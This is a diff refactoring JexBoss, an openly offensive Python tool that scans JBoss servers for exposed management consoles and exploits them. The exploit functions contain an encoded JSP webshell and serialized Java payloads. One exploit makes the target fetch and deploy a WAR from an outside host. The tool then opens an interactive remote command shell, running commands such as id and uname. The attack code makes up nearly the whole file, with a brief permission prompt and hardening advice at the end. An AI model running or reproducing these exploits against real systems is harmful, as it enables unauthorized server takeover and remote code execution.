@@ -1,18 +1,41 @@
-# coding: utf-8
-# JexBoss v1.0. @autor: João Filho Matos Figueiredo (joaomatosf@gmail.com)
-# Updates: https://github.com/joaomatosf/jexboss
-# Free for distribution and modification, but the authorship should be preserved.
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+"""
+JexBoss: Jboss verify and EXploitation Tool
+https://github.com/joaomatosf/jexboss
 
-import sys, urllib, os, time
-from urllib import urlencode
-import urllib3
+Copyright 2016 João Filho Matos Figueiredo
+
+Licensed under the Apache License, Version 2.0 (the "License");
+you may not use this file except in compliance with the License.
+You may obtain a copy of the License at
+
+    http://www.apache.org/licenses/LICENSE-2.0
+
+Unless required by applicable law or agreed to in writing, software
+distributed under the License is distributed on an "AS IS" BASIS,
+WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+See the License for the specific language governing permissions and
+limitations under the License.
+"""
+
+from sys import argv, exit
+from os import name, system
+from time import sleep
 from random import randint
+try:
+    from urllib.parse import urlencode
+except ImportError:
+    from urllib import urlencode
+
+from urllib3 import disable_warnings, PoolManager
 from urllib3.util.timeout import Timeout
-urllib3.disable_warnings()
 
+__author__ = "João Filho Matos Figueiredo <joaomatosf@gmail.com>"
+__version = "1.0.0"
 
-reload(sys)
-sys.setdefaultencoding('utf8')
+disable_warnings()
+
 
 RED = '\x1b[91m'
 RED1 = '\033[31m'
@@ -23,120 +46,138 @@ NORMAL = '\033[0m'
 ENDC = '\033[0m'
 
 timeout = Timeout(connect=3.0, read=7.0)
-pool = urllib3.PoolManager(timeout=timeout,cert_reqs='CERT_NONE')
+pool = PoolManager(timeout=timeout, cert_reqs='CERT_NONE')
 
 
 userAgents = ["Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:38.0) Gecko/20100101 Firefox/38.0",
-                "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0",
-                "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36",
-                "Mozilla/5.0 (Windows NT 5.1; rv:40.0) Gecko/20100101 Firefox/40.0",
-                "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)",
-                "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1)",
-                "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)",
-                "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0",
-                "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.86 Safari/537.36",
-                "Opera/9.80 (Windows NT 6.2; Win64; x64) Presto/2.12.388 Version/12.17"
-              ]
+              "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0",
+              "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36",
+              "Mozilla/5.0 (Windows NT 5.1; rv:40.0) Gecko/20100101 Firefox/40.0",
+              "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; "
+              ".NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)",
+              "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1)",
+              "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)",
+              "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0",
+              "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.86 Safari/537.36",
+              "Opera/9.80 (Windows NT 6.2; Win64; x64) Presto/2.12.388 Version/12.17"]
 
-def getSuccessfully(url, path):
-    result = 404
-    time.sleep(5)
-    headers = { "Accept" : "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-                    "Connection": "keep-alive",
-                    "User-Agent" : userAgents[randint(0,len(userAgents)-1)]}
+
+def get_successfully(url, path):
+    """
+    Test if a GET to a URL is successful
+    :param url: The base URL
+    :param path: The URL path
+    :return: The HTTP status code
+    """
+    sleep(5)
+    headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+               "Connection": "keep-alive",
+               "User-Agent": userAgents[randint(0, len(userAgents) - 1)]}
     r = pool.request('GET', url+path, redirect=False, headers=headers)
     result = r.status
     if result == 404:
-        time.sleep(7)
+        sleep(7)
         r = pool.request('GET', url+path, redirect=False, headers=headers)
         result = r.status
     return result
 
 
-def checkVul(url):
-    print (GREEN + " ** Checking Host: %s **\n" % url)
+def check_vul(url):
+    """
+    Test if a GET to a URL is successful
+    :param url: The URL to test
+    :return: A dict with the exploit type as the keys, and the HTTP status code as the value
+    """
+    print(GREEN + " ** Checking Host: %s **\n" % url)
 
-    headers = { "Accept" : "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-                    "Connection": "keep-alive",
-                    "User-Agent" : userAgents[randint(0,len(userAgents)-1)]}
+    headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+               "Connection": "keep-alive",
+               "User-Agent": userAgents[randint(0, len(userAgents) - 1)]}
 
     path = {"jmx-console": "/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system:type=ServerInfo",
-            "web-console" 		: "/web-console/ServerInfo.jsp" ,
-            "JMXInvokerServlet" : "/invoker/JMXInvokerServlet"}
+            "web-console" 		: "/web-console/ServerInfo.jsp",
+            "JMXInvokerServlet": "/invoker/JMXInvokerServlet"}
 
     for i in path.keys():
         try:
-            print (GREEN + " * Checking %s: \t" %i + ENDC),
+            print(GREEN + " * Checking %s: \t" % i + ENDC),
             r = pool.request('HEAD', url+str(path[i]), redirect=False, headers=headers)
             path[i] = r.status
-            if path[i] in (301,302,303, 307, 308):
-                urlredirect = r.get_redirect_location()
-                print (GREEN + "[ REDIRECT ]\n * The server sent a redirect to: %s\n" %urlredirect)
+            if path[i] in (301, 302, 303, 307, 308):
+                url_redirect = r.get_redirect_location()
+                print(GREEN + "[ REDIRECT ]\n * The server sent a redirect to: %s\n" % url_redirect)
             elif path[i] == 200 or path[i] == 500:
-                print (RED + "[ VULNERABLE ]" + ENDC)
+                print(RED + "[ VULNERABLE ]" + ENDC)
             else:
-                print (GREEN + "[ OK ]")
+                print(GREEN + "[ OK ]")
         except:
-            print (RED + "\n * An error ocurred while contaction the host %s\n" % url + ENDC)
+            print(RED + "\n * An error occurred while connected to the host %s\n" % url + ENDC)
             path[i] = 505
 
     return path
 
 
-def autoExploit(url, type):
-    # exploitJmxConsoleFileRepository: tested and working in jboss 4 and 5
-    # exploitJmxConsoleMainDeploy:	   tested and working in jboss 4 and 6
-    # exploitWebConsoleInvoker:		   tested and working in jboss 4
-    # exploitJMXInvokerFileRepository: tested and working in jboss 4 and 5
-
-    print  (GREEN +"\n * Sending exploit code to %s. Wait...\n" % url)
+def auto_exploit(url, exploit_type):
+    """
+    Automatically exploit a URL
+    :param url: The URL to exploit
+    :param exploit_type: One of the following
+    exploitJmxConsoleFileRepository: tested and working in JBoss 4 and 5
+    exploitJmxConsoleMainDeploy:	 tested and working in JBoss 4 and 6
+    exploitWebConsoleInvoker:		 tested and working in JBoss 4
+    exploitJMXInvokerFileRepository: tested and working in JBoss 4 and 5
+    """
+    print(GREEN + "\n * Sending exploit code to %s. Wait...\n" % url)
     result = 505
-    if type == "jmx-console":
-        result = exploitJmxConsoleFileRepository(url)
+    if exploit_type == "jmx-console":
+        result = exploit_jmx_console_file_repository(url)
         if result != 200 and result != 500:
-            result = exploitJmxConsoleMainDeploy(url)
-    elif type == "web-console":
-        result = exploitWebConsoleInvoker(url)
-    elif type == "JMXInvokerServlet":
-        result = exploitJMXInvokerFileRepository(url)
+            result = exploit_jmx_console_main_deploy(url)
+    elif exploit_type == "web-console":
+        result = exploit_web_console_invoker(url)
+    elif exploit_type == "JMXInvokerServlet":
+        result = exploit_jmx_invoker_file_repository(url)
 
     if result == 200 or result == 500:
-        print (GREEN + " * Successfully deployed code! Starting command shell, wait...\n" + ENDC)
-        shell_http(url, type)
+        print(GREEN + " * Successfully deployed code! Starting command shell. Please wait...\n" + ENDC)
+        shell_http(url, exploit_type)
     else:
-        print (RED + "\n * Could not exploit the flaw automatically. Exploitation requires manual analysis...\n"
-                     "   Waiting for 7 seconds...\n " + ENDC)
-        time.sleep(7)
+        print(RED + "\n * Could not exploit the flaw automatically. Exploitation requires manual analysis...\n" +
+                    "   Waiting for 7 seconds...\n " + ENDC)
+        sleep(7)
 
 
-def shell_http(url, type):
-    if type == "jmx-console" or type == "web-console":
+def shell_http(url, shell_type):
+    """
+    Connect to an HTTP shell
+    :param url: The URL to connect to
+    :param shell_type: The type of shell to connect to
+    """
+    if shell_type == "jmx-console" or shell_type == "web-console":
         path = '/jbossass/jbossass.jsp?'
-    elif type == "JMXInvokerServlet":
+    elif shell_type == "JMXInvokerServlet":
         path = '/shellinvoker/shellinvoker.jsp?'
 
-    headers = { "Accept" : "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-                    "Connection": "keep-alive",
-                    "User-Agent" : "jexboss" }
+    headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+               "Connection": "keep-alive",
+               "User-Agent": "jexboss"}
 
-    r = pool.request('GET', url+path, redirect=False, headers=headers)
+    pool.request('GET', url+path, redirect=False, headers=headers)
 
-    time.sleep(7)
+    sleep(7)
     resp = ""
-    # clear()
-    print (" * - - - - - - - - - - - - - - - - - - - - LOL - - - - - - - - - - - - - - - - - - - - * \n")
-    print (RED + " * " + url + ": \n" + ENDC)
+    print(" * - - - - - - - - - - - - - - - - - - - - LOL - - - - - - - - - - - - - - - - - - - - * \n")
+    print(RED + " * " + url + ": \n" + ENDC)
 
     for cmd in ['uname -a', 'cat /etc/issue', 'id']:
         cmd = urlencode({"ppp": cmd})
         r = pool.request('GET', url+path+cmd, redirect=False, headers=headers)
         resp += " " + r.data.split(">")[1]
-    print (resp),
+    print(resp),
 
     while 1:
-        print (BLUE + "[Type commands or \"exit\" to finish]")
-        cmd = raw_input("Shell> " + ENDC)
-        # print ENDC
+        print(BLUE + "[Type commands or \"exit\" to finish]")
+        cmd = input("Shell> " + ENDC)
         if cmd == "exit":
             break
 
@@ -144,46 +185,48 @@ def shell_http(url, type):
         r = pool.request('GET', url+path+cmd, redirect=False, headers=headers)
         resp = r.data
         if r.status == 404:
-            print (RED + " * Error contacting the commando shell. Try again later...")
+            print(RED + " * Error contacting the command shell. Try again later...")
             continue
         stdout = ""
         try:
             stdout = resp.split("pre>")[1]
         except:
-            print (RED + " * Error contacting the commando shell. Try again later...")
+            print(RED + " * Error contacting the command shell. Try again later...")
         if stdout.count("An exception occurred processing JSP page") == 1:
-            print (RED + " * Error executing command \"%s\". " % cmd.split("=")[1] + ENDC)
+            print(RED + " * Error executing command \"%s\". " % cmd.split("=")[1] + ENDC)
         else:
-            print (stdout),
+            print(stdout)
 
 
-
-def exploitJmxConsoleMainDeploy(url):
-    # MainDeployer
-    # does not work in jboss5 (bug in jboss5)
-    # shell in link
-    # /jmx-console/HtmlAdaptor
+def exploit_jmx_console_main_deploy(url):
+    """
+    Exploit MainDeployer to deploy a JSP shell. Does not work in JBoss 5 (bug in JBoss 5).
+    /jmx-console/HtmlAdaptor
+    :param url: The url to exploit
+    :return: The HTTP status code
+    """
     jsp = "http://www.joaomatosf.com/rnp/jbossass.war"
     payload = ("/jmx-console/HtmlAdaptor?action=invokeOp&name=jboss.system:service"
                "=MainDeployer&methodIndex=19&arg0=" + jsp)
-    print (GREEN + "\n * Info: This exploit will force the server to deploy the webshell "
-                   "\n   available on: " + jsp + ENDC)
+    print(GREEN + "\n * Info: This exploit will force the server to deploy the webshell " +
+                  "\n   available at: " + jsp + ENDC)
 
-    headers = { "Accept" : "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-                    "Connection": "keep-alive",
-                    "User-Agent" : userAgents[randint(0,len(userAgents)-1)]}
+    headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+               "Connection": "keep-alive",
+               "User-Agent": userAgents[randint(0, len(userAgents)-1)]}
 
     r = pool.request('HEAD', url+payload, redirect=False, headers=headers)
-    result = r.status
-    return getSuccessfully(url, "/jbossass/jbossass.jsp")
+    return get_successfully(url, "/jbossass/jbossass.jsp")
 
 
-def exploitJmxConsoleFileRepository(url):
-    # DeploymentFileRepository
-    # tested and work in jboss4, 5.
-    # doest not work in jboss6
-    # shell jsp
-    # /jmx-console/HtmlAdaptor
+def exploit_jmx_console_file_repository(url):
+    """
+    Exploit DeploymentFileRepository to deploy a JSP shell
+    Tested and working in JBoss 4, 5. Does not work in JBoss 6.
+    /jmx-console/HtmlAdaptor
+    :param url: The URL to exploit
+    :return: The HTTP status code
+    """
     jsp = ("%3C%25%40%20%70%61%67%65%20%69%6D%70%6F%72%74%3D%22%6A%61%76%61"
            "%2E%75%74%69%6C%2E%2A%2C%6A%61%76%61%2E%69%6F%2E%2A%22%25%3E%3C"
            "%70%72%65%3E%3C%25%20%69%66%20%28%72%65%71%75%65%73%74%2E%67%65"
@@ -208,18 +251,22 @@ def exploitJmxConsoleFileRepository(url):
                "jbossass.war&argType=java.lang.String&arg1=jbossass&argType=java.lang.St"
                "ring&arg2=.jsp&argType=java.lang.String&arg3=" + jsp + "&argType=boolean&arg4=True")
 
-    headers = { "Accept" : "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-                    "Connection": "keep-alive",
-                    "User-Agent" : userAgents[randint(0,len(userAgents)-1)]}
-    r = pool.request('HEAD', url+payload, redirect=False, headers=headers)
-    result = r.status
-    return getSuccessfully(url, "/jbossass/jbossass.jsp")
+    headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+               "Connection": "keep-alive",
+               "User-Agent": userAgents[randint(0, len(userAgents) - 1)]}
+    pool.request('HEAD', url+payload, redirect=False, headers=headers)
+    return get_successfully(url, "/jbossass/jbossass.jsp")
 
 
-def exploitJMXInvokerFileRepository(url):
-    # tested and work in jboss4, 5
-    # MainDeploy, shell in data
+def exploit_jmx_invoker_file_repository(url):
+    """
+    Exploits the JMX invoker
+    tested and works in JBoss 4, 5
+    MainDeploy, shell in data
     # /invoker/JMXInvokerServlet
+    :param url: The URL to exploit
+    :return:
+    """
     payload = ("\xac\xed\x00\x05\x73\x72\x00\x29\x6f\x72\x67\x2e\x6a\x62\x6f\x73"
                "\x73\x2e\x69\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\x2e\x4d\x61\x72"
                "\x73\x68\x61\x6c\x6c\x65\x64\x49\x6e\x76\x6f\x63\x61\x74\x69\x6f"
@@ -285,24 +332,19 @@ def exploitJMXInvokerFileRepository(url):
                "\x00\x04\x70\x78")
 
     headers = {"Content-Type": "application/x-java-serialized-object; class=org.jboss.invocation.MarshalledValue",
-               "Accept": "text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2" ,
+               "Accept": "text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2",
                "Connection": "keep-alive",
-               "User-Agent" : userAgents[randint(0,len(userAgents)-1)] }
+               "User-Agent": userAgents[randint(0, len(userAgents)-1)]}
 
     r = pool.urlopen('POST', url+"/invoker/JMXInvokerServlet", redirect=False, headers=headers, body=payload)
     result = r.status
-    response = r.data
     if result == 401:
-        print ("   Retrying...")
-        r = pool.urlopen('HEAD', url+"/invoker/JMXInvokerServlet", redirect=False, headers=headers, body=payload)
-        result = r.status
-        response = r.data
-    if response.count("Failed") > 0:
-        result = 505
-    return getSuccessfully(url, "/shellinvoker/shellinvoker.jsp")
+        print("   Retrying...")
+    pool.urlopen('HEAD', url+"/invoker/JMXInvokerServlet", redirect=False, headers=headers, body=payload)
+    return get_successfully(url, "/shellinvoker/shellinvoker.jsp")
 
 
-def exploitWebConsoleInvoker(url):
+def exploit_web_console_invoker(url):
     # does not work in jboss5 (bug in jboss5)
     # MainDeploy, shell in link
     # /web-console/Invoker
@@ -347,26 +389,31 @@ def exploitWebConsoleInvoker(url):
         "Content-Type": "application/x-java-serialized-object; class=org.jboss.console.remote.RemoteMBeanInvocation",
         "Accept": "text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2",
         "Connection": "keep-alive",
-        "User-Agent" : userAgents[randint(0,len(userAgents)-1)] }
+        "User-Agent": userAgents[randint(0, len(userAgents) - 1)]}
     r = pool.urlopen('POST', url+"/web-console/Invoker", redirect=False, headers=headers, body=payload)
-    response = r.data
     result = r.status
     if result == 401:
-        print ("   Retrying...")
-        r = pool.urlopen('HEAD', url+"/web-console/Invoker", redirect=False, headers=headers, body=payload)
-        response = r.data
-        result = r.status
-    return getSuccessfully(url, "/jbossass/jbossass.jsp")
+        print("   Retrying...")
+    pool.urlopen('HEAD', url + "/web-console/Invoker", redirect=False, headers=headers, body=payload)
+    return get_successfully(url, "/jbossass/jbossass.jsp")
 
 
 def clear():
-    if os.name == 'posix':
-        os.system('clear')
-    elif os.name == ('ce', 'nt', 'dos'):
-        os.system('cls')
+    """
+    Clears the console
+    """
+    if name == 'posix':
+        system('clear')
+    elif name == ('ce', 'nt', 'dos'):
+        system('cls')
 
 
-def checkArgs(args):
+def check_args(args):
+    """
+    Check the command-line arguments
+    :param args: The arguments to check
+    :returns: Exit code, message
+    """
     if len(args) < 2 or args[1].count('.') < 1:
         return 1, "You must provide the host name or IP address you want to test."
     else:
@@ -374,81 +421,84 @@ def checkArgs(args):
 
 
 def banner():
+    """
+    Print the banner
+    """
     clear()
-    print (RED1 + "\n * --- JexBoss: Jboss verify and EXploitation Tool  --- *\n"
-                  " |                                                      |\n"
-                  " | @author:  João Filho Matos Figueiredo                |\n"
-                  " | @contact: joaomatosf@gmail.com                       |\n"
-                  " |                                                      |\n"
-                  " | @update: https://github.com/joaomatosf/jexboss       |\n"
-                  " #______________________________________________________#\n\n")
+    print(RED1 + "\n * --- JexBoss: Jboss verify and EXploitation Tool  --- *\n"
+                 " |                                                      |\n"
+                 " | @author:  João Filho Matos Figueiredo                |\n"
+                 " | @contact: joaomatosf@gmail.com                       |\n"
+                 " |                                                      |\n"
+                 " | @update: https://github.com/joaomatosf/jexboss       |\n"
+                 " #______________________________________________________#\n\n")
 
+
+def main():
+    """
+    Run interactively. Call when the module is run by itself.
+    :return: Exit code
+    """
+    # check Args
+    status, message = check_args(argv)
+    if status == 0:
+        url = argv[1]
+    elif status == 1:
+        print(RED + "\n * Error: %s" % message)
+        print(BLUE + "\n Example:\n python %s https://site.com.br\n" % argv[0] + ENDC)
+        exit(status)
+
+    # check vulnerabilities
+    scan_results = check_vul(url)
+
+    # performs exploitation
+    for i in ["jmx-console", "web-console", "JMXInvokerServlet"]:
+        if scan_results[i] == 200 or scan_results[i] == 500:
+            print(BLUE + "\n\n * Do you want to try to run an automated exploitation via \"" +
+                  BOLD + i + NORMAL + "\" ?\n" +
+                  "   This operation will provide a simple command shell to execute commands on the server..\n" +
+                  RED + "   Continue only if you have permission!" + ENDC)
+            if input("   yes/NO ? ").lower() == "yes":
+                auto_exploit(url, i)
+
+    # resume results
+    if list(scan_results.values()).count(200) > 0:
+        banner()
+        print(RED + " Results: potentially compromised server!" + ENDC)
+        print(GREEN + " * - - - - - - -  - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -*\n"
+                       " Recommendations: \n"
+                       " - Remove web consoles and services that are not used, eg:\n"
+                       "    $ rm web-console.war\n"
+                       "    $ rm http-invoker.sar\n"
+                       "    $ rm jmx-console.war\n"
+                       "    $ rm jmx-invoker-adaptor-server.sar\n"
+                       "    $ rm admin-console.war\n"
+                       " - Use a reverse proxy (eg. nginx, apache, f5)\n"
+                       " - Limit access to the server only via reverse proxy (eg. DROP INPUT POLICY)\n"
+                       " - Search vestiges of exploitation within the directories \"deploy\" or \"management\".\n\n"
+                       " References:\n"
+                       "   [1] - https://developer.jboss.org/wiki/SecureTheJmxConsole\n"
+                       "   [2] - https://issues.jboss.org/secure/attachment/12313982/jboss-securejmx.pdf\n"
+                       "\n"
+                       " - If possible, discard this server!\n"
+                       " * - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -*\n")
+    elif list(scan_results.values()).count(505) == 0:
+        print(GREEN + "\n\n * Results: \n" +
+                      "   The server is not vulnerable to bugs tested ... :D\n\n" + ENDC)
+    # infos
+    print(ENDC + " * Info: review, suggestions, updates, etc: \n" +
+                 "   https://github.com/joaomatosf/jexboss\n"
+                 "   joaomatosf@gmail.com\n")
+
+    print(GREEN + BOLD + " * DONATE: " + ENDC + "Please consider making a donation to help improve this tool,\n"
+          "           including research to new versions of JBoss and zero days. \n\n" +
+          GREEN + BOLD + " * Bitcoin Address: " + ENDC + " 14x4niEpfp7CegBYr3tTzTn4h6DAnDCD9C \n" +
+          GREEN + BOLD + " * URI: " + ENDC + " bitcoin:14x4niEpfp7CegBYr3tTzTn4h6DAnDCD9C?label=jexboss\n")
+
+
+print(ENDC)
 
 banner()
-# check python version
-if sys.version_info[0] == 3:
-    print (RED + "\n * Not compatible with version 3 of python.\n"
-                 "   Please run it with version 2.7 or lower.\n\n"
-           + BLUE + " * Example:\n"
-                    "   python2.7 " + sys.argv[0] + " https://site.com\n\n" + ENDC)
-    sys.exit(1)
 
-# check Args
-status, message = checkArgs(sys.argv)
-if status == 0:
-    url = sys.argv[1]
-elif status == 1:
-    print (RED + "\n * Error: %s" % message)
-    print (BLUE + "\n Example:\n python %s https://site.com.br\n" % sys.argv[0] + ENDC)
-    sys.exit(status)
-
-# check vulnerabilities
-mapResult = checkVul(url)
-
-# performs exploitation
-for i in ["jmx-console", "web-console", "JMXInvokerServlet"]:
-    if mapResult[i] == 200 or mapResult[i] == 500:
-        print (BLUE + "\n\n * Do you want to try to run an automated exploitation via \"" + BOLD + i + NORMAL + "\" ?\n"
-		"   This operation will provide a simple command shell to execute commands on the server..\n"
-                      + RED + "   Continue only if you have permission!" + ENDC)
-        if raw_input("   yes/NO ? ").lower() == "yes":
-            autoExploit(url, i)
-
-# resume results
-if mapResult.values().count(200) > 0:
-    banner()
-    print (RED + " Results: potentially compromised server!" + ENDC)
-    print (GREEN + " * - - - - - - -  - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -*\n"
-                   " Recommendations: \n"
-                   " - Remove web consoles and services that are not used, eg:\n"
-                   "    $ rm web-console.war\n"
-                   "    $ rm http-invoker.sar\n"
-                   "    $ rm jmx-console.war\n"
-                   "    $ rm jmx-invoker-adaptor-server.sar\n"
-                   "    $ rm admin-console.war\n"
-                   " - Use a reverse proxy (eg. nginx, apache, f5)\n"
-                   " - Limit access to the server only via reverse proxy (eg. DROP INPUT POLICY)\n"
-                   " - Search vestiges of exploitation within the directories \"deploy\" or \"management\".\n\n"
-                   " References:\n"
-                   "   [1] - https://developer.jboss.org/wiki/SecureTheJmxConsole\n"
-                   "   [2] - https://issues.jboss.org/secure/attachment/12313982/jboss-securejmx.pdf\n"
-                   "\n"
-                   " - If possible, discard this server!\n"
-                   " * - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -*\n")
-elif mapResult.values().count(505) == 0:
-    print (GREEN + "\n\n * Results: \n"
-                   "   The server is not vulnerable to bugs tested ... :D\n\n" + ENDC)
-# infos
-print (ENDC + " * Info: review, suggestions, updates, etc: \n"
-              "   https://github.com/joaomatosf/jexboss\n"
-              "   joaomatosf@gmail.com\n")
-
-print (GREEN +BOLD+ " * DONATE: "+ENDC+ "Please consider making a donation to help improve this tool,\n"
-               "           including research to new versions of JBoss and zero days. \n\n"
-       +GREEN +BOLD+ " * Bitcoin Address: "+ENDC+ " 14x4niEpfp7CegBYr3tTzTn4h6DAnDCD9C \n"
-       +GREEN +BOLD+ " * URI: "+ENDC+ " bitcoin:14x4niEpfp7CegBYr3tTzTn4h6DAnDCD9C?label=jexboss\n")
-
-
-
-
-print (ENDC)
+if __name__ == "__main__":
+    main()
